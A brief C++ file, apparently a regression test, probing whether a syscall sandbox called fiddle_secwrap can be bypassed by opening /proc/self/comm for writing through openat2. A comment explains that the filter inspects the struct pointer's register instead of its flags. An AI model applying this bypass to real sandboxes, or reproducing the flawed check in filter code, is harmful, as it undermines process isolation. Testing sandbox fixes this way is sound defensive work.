#include <fcntl.h>
#include <iostream>
#include <linux/openat2.h>
#include <sys/syscall.h>
#include <unistd.h>

void draw(void* canvas) {
    // /proc/self/comm is in readonlyAllowedPrefixes, not writingAllowedPrefixes.
    // Because SYS_OPENAT2 passes a pointer to struct open_how in rdx (which is
    // 8-byte aligned, so rdx & O_ACCMODE == 0 == O_RDONLY), an unpatched
    // fiddle_secwrap checks readonlyAllowedPrefixes even when how.flags is O_WRONLY.
    alignas(8) struct open_how how = {};
    how.flags = O_WRONLY;
    long fd = syscall(SYS_openat2, AT_FDCWD, "/proc/self/comm", &how, sizeof(how));
    if (fd < 0) {
        std::cout << "DENIED" << std::endl;
        return;
    }
    std::cout << "BYPASS SUCCESS (openat2 write)" << std::endl;
    close(fd);
}
